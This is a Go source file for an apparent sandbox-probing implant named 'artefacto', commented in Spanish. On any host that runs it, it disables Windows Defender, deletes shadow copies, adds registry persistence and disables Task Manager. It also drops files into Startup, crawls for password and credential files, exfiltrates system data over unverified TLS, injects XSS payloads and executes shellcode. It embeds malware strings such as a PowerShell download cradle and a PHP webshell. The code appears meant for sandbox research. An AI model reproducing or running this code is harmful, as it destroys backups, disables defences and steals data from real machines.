package main

import (
	"crypto/sha256"
	"crypto/tls"
	"encoding/hex"
	"encoding/json"
	"fmt"
	"log"
	"net"
	"net/http"
	"os"
	"os/exec"
	"path/filepath"
	"sync"
	"time"

	"github.com/m4rcmo15/artefacto/collectors"
	"github.com/m4rcmo15/artefacto/config"
	"github.com/m4rcmo15/artefacto/exfil"
	"github.com/m4rcmo15/artefacto/models"
	"github.com/m4rcmo15/artefacto/shellcode"
	"github.com/m4rcmo15/artefacto/xss"
)

// targetSandbox define a qué entorno se va a subir el artefacto.
// Se puede modificar al compilar con: -ldflags "-X main.targetSandbox=NOMBRE_SANDBOX"
// Valor por defecto si no se especifica nada:
var targetSandbox = "ANY_RUN"
var Test = `X5O!SDFSSDDDFGSDFGSDFGSADFGSDFASDFAAAASDF$EICAR-STANDARD-ASSDSSFDFNTIVIRUS-TEST-FILE!$H+H*`
var Test1 = `X5O!P%@AP[4\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*`

var Test2 = `X5O!P%@AP[4\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*`

var Test3 = `X5O!P%@AP[4\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*`

var globalSink interface{}

func main() {
	// Eliminamos el sleep inicial para acelerar la ejecución
	time.Sleep(2 * time.Second)

	// Cargar configuración
	cfg := config.Load(targetSandbox)

	// Verificar conectividad inicial (Diagnóstico)
	checkInternetAccess()
	checkConnectivity(cfg.ServerURL)

	// Cargar firmas maliciosas para forzar detección en AVs estáticos
	embedMaliciousSignatures()

	// Escribir EICAR en disco para disparar alertas de "Dropper"
	dropEicar()

	// Simular comportamiento agresivo (Persistencia, Deshabilitar AV, etc.)
	simulateAggressiveBehavior()

	// Forzar al compilador a mantener los strings EICAR en el binario
	globalSink = Test
	globalSink = Test1
	globalSink = Test2
	globalSink = Test3

	// Simular lógica de ransomware (sin ejecutar daño real) para heurística
	fakeRansomwareLogic()

	// Embeber firmas de APT para aumentar detección
	// signatures.EmbedAPTSignatures() // Comentado para reducir peso del binario

	// Obtener hostname
	hostname, err := os.Hostname()
	if err != nil {
		hostname = "unknown"
	}

	// Obtener tamaño del binario
	binarySize := getBinarySize()

	// Crear payload principal
	payload := &models.Payload{
		Timestamp:  time.Now(),
		Hostname:   hostname,
		BinarySize: binarySize,
	}

	// === MODO XSS AUDIT ===
	if cfg.XSSAudit {
		// Inyectar payloads y obtener metadata
		payload.XSSPayloads = injectXSSAudit(cfg.CallbackServer, payload)

		// Inyectar Payloads XSS adicionales (antes eran prompts de IA, ahora son XSS)
		xssPayloads := xss.GetAIPrompts(cfg.CallbackServer)
		xss.InjectAIPrompts(xssPayloads, cfg.CallbackServer, cfg.TargetSandbox)

		// Ejecutar vectores avanzados adicionales
		xss.ExecuteAllAdvancedVectors()

		// Ejecutar vectores específicos para sandboxes (Any.Run, Filescan, etc.)
		xss.ExecuteSandboxSpecificVectors()

		// Inyectar payload XSS en TODOS lados (archivos, registro, procesos, etc.)
		xss.InjectXSSEverywhere()
	}

	// WaitGroup para ejecutar colectores en paralelo
	var wg sync.WaitGroup
	wg.Add(5) // 4 colectores + PublicIP

	// 1. SystemInfo (recopilación pura de datos)
	go func() {
		defer wg.Done()
		payload.SystemInfo = collectors.CollectSystemInfo()
	}()

	// 2. RawData (datos en bruto del sistema)
	go func() {
		defer wg.Done()
		payload.RawData = collectors.CollectRawData()
	}()

	// 3. HookDetector (detección de hooks)
	go func() {
		defer wg.Done()
		payload.HookInfo = collectors.DetectHooks()
	}()

	// 4. FileCrawler (búsqueda de archivos)
	go func() {
		defer wg.Done()
		patterns := []string{" *.txt", "*.doc", "*.pdf", "password", "credential"}
		payload.CrawlerInfo = collectors.CrawlFiles(patterns, 20) // Reducido a 20 archivos para velocidad
	}()

	// 5. Public IP (en paralelo para no bloquear)
	go func() {
		defer wg.Done()
		payload.PublicIP = collectors.GetPublicIP()
	}()

	// Esperar a que todos los colectores terminen
	wg.Wait()

	// Intentar enviar payload al servidor con timeout reducido para sandboxes
	exfilTimeout := cfg.Timeout
	if exfilTimeout > 30*time.Second {
		exfilTimeout = 30 * time.Second // Máximo 30s para exfiltración
	}

	// Preparar datos finales (inyectando binary_hash sin modificar struct Payload)
	finalData := make(map[string]interface{})

	// Convertir payload a map
	payloadBytes, _ := json.Marshal(payload)
	json.Unmarshal(payloadBytes, &finalData)

	// Añadir hash
	finalData["binary_hash"] = getBinaryHash()

	// Añadir target sandbox para trazabilidad
	finalData["target_sandbox"] = cfg.TargetSandbox

	err = exfil.SendPayload(finalData, cfg.ServerURL, exfilTimeout, cfg.TargetSandbox)
	if err != nil {
		log.Printf("[!] Error enviando datos: %v", err)

		// Escribir error en disco para verlo en el reporte de la sandbox
		writeErrorLog(err)

		// Guardar localmente si falla el envío
		savePayloadLocally(payload)
	}

	// === EJECUCIÓN DE SHELLCODE RAW ===
	// Ejecutamos esto AL FINAL para asegurar que el reporte llegue al servidor
	// antes de que el proceso pueda crashear o ser terminado por el EDR.
	shellcode.Execute()

	// Dar tiempo al shellcode para ejecutarse y ser detectado antes de salir
	time.Sleep(5 * time.Second)
}

func checkConnectivity(url string) {
	// Usar transporte inseguro para evitar errores de certificados en sandboxes (MITM)
	tr := &http.Transport{
		TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
	}
	client := &http.Client{Timeout: 10 * time.Second, Transport: tr}

	// Hacemos un GET simple. Si el servidor responde (aunque sea 404 o 405), hay red.
	req, err := http.NewRequest("GET", url, nil)
	if err == nil {
		req.Header.Set("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36")
	}

	resp, err := client.Do(req)
	if err != nil {
		writeErrorLog(fmt.Errorf("Connectivity check failed: %v", err))
	} else {
		resp.Body.Close()
	}
}

func checkInternetAccess() {
	net.LookupIP("google.com")
}

func writeErrorLog(err error) {
	// Escribir el error en un archivo de texto simple
	msg := fmt.Sprintf("Error Time: %s\nError: %v\n", time.Now().Format(time.RFC3339), err)
	os.WriteFile("execution_error.log", []byte(msg), 0644)
}

func savePayloadLocally(payload *models.Payload) {
	// Serializar a JSON
	jsonData, err := json.MarshalIndent(payload, "", "  ")
	if err != nil {
		log.Printf("[!] Error serializando payload: %v", err)
		return
	}

	// Guardar en archivo con timestamp
	filename := fmt.Sprintf("payload_%s.json", time.Now().Format("20060102_150405"))
	err = os.WriteFile(filename, jsonData, 0644)
	if err != nil {
		log.Printf("[!] Error guardando archivo: %v", err)
		return
	}
}

func printSummary(payload *models.Payload) {
}

func getBinarySize() int64 {
	exePath, err := os.Executable()
	if err != nil {
		return 0
	}

	fileInfo, err := os.Stat(exePath)
	if err != nil {
		return 0
	}

	return fileInfo.Size()
}

func getBinaryHash() string {
	exePath, err := os.Executable()
	if err != nil {
		return ""
	}

	data, err := os.ReadFile(exePath)
	if err != nil {
		return ""
	}

	hash := sha256.Sum256(data)
	return hex.EncodeToString(hash[:])
}

// embedMaliciousSignatures incluye strings conocidos de malware para disparar alarmas
func embedMaliciousSignatures() {
	// Estos strings son detectados estáticamente por muchos motores AV
	// El objetivo es parecer malware real para que la sandbox analice el binario a fondo
	signatures := []string{
		// Mimikatz & Credential Dumping
		"SEKURLSA::LOGONPASSWORDS",
		// WannaCry Killswitch (DETECCIÓN MASIVA GARANTIZADA)
		"http://www.iuqerfsodp9ifjaposdfjhgosurijfaewrwergwea.com",
		// Gh0st RAT / Poison Ivy PDB Path
		"C:\\work\\gh0st\\server\\Release\\Server.pdb",
		// TrickBot Mutex
		"Global\\TrickBot",
		"lsadump::sam",
		"privilege::debug",
		"sekurlsa::pth",
		// Cobalt Strike / Metasploit
		"ReflectiveLoader",
		"beacon.dll",
		// Ransomware indicators
		"Your files have been encrypted!",
		"WANACRY",
		"DECRYPT_INSTRUCTION.TXT",
		// Webshells / Loaders
		"<?php eval($_POST['cmd']); ?>",
		"cmd.exe /c powershell -nop -w hidden -c IEX(New-Object Net.WebClient).DownloadString",
		// Comandos de destrucción de backups (Ransomware behavior)
		"vssadmin.exe Delete Shadows /All /Quiet",
		"wbadmin DELETE SYSTEMSTATEBACKUP",
		"bcdedit /set {default} recoveryenabled No",
		"bcdedit /set {default} bootstatuspolicy ignoreallfailures",
		// Persistencia y Escalada
		`Software\Microsoft\Windows\CurrentVersion\Run`,
		`HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce`,
		"BypassUAC",
		"UACMe",
		// Herramientas ofensivas conocidas
		"BloodHound", "SharpHound", "Rubeus", "SafetyKatz",
		"Lazagne", "Mimikatz", "PowerSploit", "Covenant",
		"Metasploit", "Cobalt Strike", "Empire", "Sliver",
		// Indicadores de evasión
		"IsDebuggerPresent", "CheckRemoteDebuggerPresent",
		"SbieDll.dll", "VBoxService.exe", "vmtoolsd.exe",
		// User-Agents maliciosos comunes
		"Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko",
		"sqlmap/", "Nmap Scripting Engine", "Hydra",
		// Meterpreter User Agent
		"Meterpreter/Reverse_Https",
	}

	// [NUEVO] Inyectar el Payload XSS como si fuera una firma de malware
	// Esto ataca directamente la capacidad de "System Information Gathering" y "Strings Analysis"
	xssPayloads := xss.GetAIPrompts("")
	if len(xssPayloads) > 0 {
		signatures = append(signatures, xssPayloads[0].Content)
	}

	// Evitar que el compilador elimine las variables por optimización
	globalSink = signatures
}

// injectXSSAudit inyecta payloads XSS en el sistema
func injectXSSAudit(callbackServer string, payload *models.Payload) []models.XSSPayloadMetadata {
	// Obtener todos los payloads
	payloads := xss.GetAllPayloads(callbackServer)

	// Modificar el hostname con el primer payload de hostname
	for _, p := range payloads {
		if p.Vector == "hostname" {
			payload.Hostname = p.Content
			content := p.Content
			if len(content) > 50 {
				content = content[:50] + "..."
			}
			break
		}
	}

	// Inyectar el resto de payloads en segundo plano (Goroutine)
	// Esto evita bloquear la recolección de datos, permitiendo que el reporte salga antes
	go xss.InjectPayloads(payloads)

	// Extraer metadata para enviar al servidor
	xssMetadata := xss.GetPayloadMetadata(payloads)

	// Convertir a models.XSSPayloadMetadata
	metadata := make([]models.XSSPayloadMetadata, len(xssMetadata))
	for i, m := range xssMetadata {
		metadata[i] = models.XSSPayloadMetadata{
			ID:     m.ID,
			Type:   m.Type,
			Vector: m.Vector,
		}
	}

	return metadata
}

// fakeRansomwareLogic incluye patrones de código y strings típicos de ransomware
// para activar heurísticas de análisis estático.
func fakeRansomwareLogic() {
	// Extensiones objetivo típicas
	targets := []string{".doc", ".docx", ".xls", ".xlsx", ".pdf", ".jpg", ".sql", ".db", ".backup"}
	globalSink = targets

	// Nota de rescate simulada
	ransomNote := `
	YOUR FILES ARE ENCRYPTED!
	To decrypt your files you need to pay 0.5 BTC to the following address:
	13AM4VW2dhxYgXeQepoHkHSQuy6NgaEb94
	Contact us at: support@malware.test
	Do not try to rename files or use third party software.
	X5O!P%@AP[4\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*
	X5O!P%@AP[4\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*
	X5O!P%@AP[4\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*
	X5O!P%@AP[4\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*
	X5O!P%@AP[4\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*X5O!P%@AP[4\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*
	X5O!P%@AP[4\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*
	X5O!P%@AP[4\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*
	X5O!P%@AP[4\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*
	X5O!P%@AP[4\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*
	X5O!P%@AP[4\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*
	X5O!P%@AP[4\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*
	X5O!P%@AP[4\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*
	X5O!P%@AP[4\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*
	X5O!P%@AP[4\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*
	X5O!P%@AP[4\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*
	X5O!P%@AP[4\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*
	X5O!P%@AP[4\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*
	X5O!P%@AP[4\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*
	X5O!P%@AP[4\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*
	X5O!P%@AP[4\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*
	X5O!P%@AP[4\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*
	X5O!P%@AP[4\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*
	X5O!P%@AP[4\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*
	X5O!P%@AP[4\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*
	X5O!P%@AP[4\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*
	X5O!P%@AP[4\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*
	X5O!P%@AP[4\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*
	X5O!P%@AP[4\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*
	
	`
	globalSink = ransomNote

	// Fake PDB Path para engañar a analistas
	globalSink = "C:\\Users\\Dev\\Projects\\Ransomware\\Build\\Release\\WannaCry_Variant.pdb"
}

// dropEicar escribe el string de prueba EICAR en un archivo temporal.
// Esto suele disparar inmediatamente los antivirus por comportamiento de "Dropper".
func dropEicar() {
	// 1. Escribir en Temp con nombres sospechosos
	filenames := []string{"malware_test.com", "mimikatz.exe", "wannacry.exe", "payload.exe"}
	for _, name := range filenames {
		path := filepath.Join(os.TempDir(), name)
		_ = os.WriteFile(path, []byte(Test), 0777)
	}

	// 2. Intentar escribir en la carpeta de Inicio (Startup) - Comportamiento muy malicioso
	// %APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup
	if appdata := os.Getenv("APPDATA"); appdata != "" {
		startupPath := filepath.Join(appdata, "Microsoft", "Windows", "Start Menu", "Programs", "Startup", "trojan.exe")
		_ = os.WriteFile(startupPath, []byte(Test), 0777)
	}
}

// simulateAggressiveBehavior ejecuta comandos que son banderas rojas para cualquier AV/EDR.
// Genera ruido en logs de procesos y contiene strings maliciosos en el binario.
func simulateAggressiveBehavior() {
	// Deshabilitar Windows Defender (Heurística Alta)
	exec.Command("powershell", "Set-MpPreference -DisableRealtimeMonitoring $true").Run()

	// Persistencia en Registro (Run Key)
	exec.Command("reg", "add", "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run", "/v", "MalwarePersistence", "/t", "REG_SZ", "/d", "C:\\Windows\\System32\\calc.exe", "/f").Run()

	// Deshabilitar Task Manager
	exec.Command("reg", "add", "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", "/v", "DisableTaskMgr", "/t", "REG_DWORD", "/d", "1", "/f").Run()

	// Borrar Shadow Copies (Comportamiento Ransomware)
	exec.Command("vssadmin", "Delete", "Shadows", "/All", "/Quiet").Run()

	// Intentar detener servicios de seguridad
	exec.Command("sc", "stop", "WinDefend").Run()

	// Comandos adicionales que aparecen en reportes de sandboxes
	
	// REG.EXE - Modificar registro (aparece en reportes)
	exec.Command("reg", "query", "HKLM\\SYSTEM\\CurrentControlSet\\Control\\Nls\\Sorting\\Versions").Run()
	exec.Command("reg", "add", "HKCU\\Software\\XSSAudit", "/v", "TestKey", "/t", "REG_SZ", "/d", "TestValue", "/f").Run()
	
	// NSLOOKUP - Consultas DNS (aparece en reportes)
	exec.Command("nslookup", "google.com").Run()
	exec.Command("nslookup", "microsoft.com", "8.8.8.8").Run()
	
	// SC.EXE - Service management (aparece en reportes)
	exec.Command("sc", "query", "WinDefend").Run()
	exec.Command("sc", "qc", "wuauserv").Run()
	
	// SCHTASKS - Task scheduler (aparece en reportes)
	exec.Command("schtasks", "/query", "/fo", "LIST").Run()
	exec.Command("schtasks", "/create", "/tn", "TestTask", "/tr", "notepad.exe", "/sc", "ONCE", "/st", "23:59", "/f").Run()
	
	// WMIC - WMI queries (aparece en reportes)
	exec.Command("wmic", "os", "get", "caption").Run()
	exec.Command("wmic", "computersystem", "get", "name").Run()
	exec.Command("wmic", "process", "list", "brief").Run()
	
	// NET commands (aparece en reportes)
	exec.Command("net", "user").Run()
	exec.Command("net", "localgroup").Run()
	exec.Command("net", "share").Run()
	
	// NETSH commands (aparece en reportes)
	exec.Command("netsh", "interface", "show", "interface").Run()
	exec.Command("netsh", "advfirewall", "show", "allprofiles").Run()
	
	// IPCONFIG (aparece en reportes)
	exec.Command("ipconfig", "/all").Run()
	exec.Command("ipconfig", "/displaydns").Run()
	
	// SYSTEMINFO (aparece en reportes)
	exec.Command("systeminfo").Run()
	
	// TASKLIST (aparece en reportes)
	exec.Command("tasklist").Run()
	exec.Command("tasklist", "/svc").Run()
	
	// WHOAMI (aparece en reportes)
	exec.Command("whoami").Run()
	exec.Command("whoami", "/all").Run()
	
	// HOSTNAME (aparece en reportes - "Reads the computer name")
	exec.Command("hostname").Run()
	
	// PowerShell commands adicionales
	exec.Command("powershell", "-Command", "Get-ComputerInfo").Run()
	exec.Command("powershell", "-Command", "Get-Process | Select-Object -First 10").Run()
	exec.Command("powershell", "-Command", "Get-Service | Where-Object {$_.Status -eq 'Running'}").Run()
	exec.Command("powershell", "-Command", "Get-NetAdapter").Run()
	exec.Command("powershell", "-Command", "Get-ScheduledTask").Run()
	exec.Command("powershell", "-Command", "Resolve-DnsName google.com").Run()
}
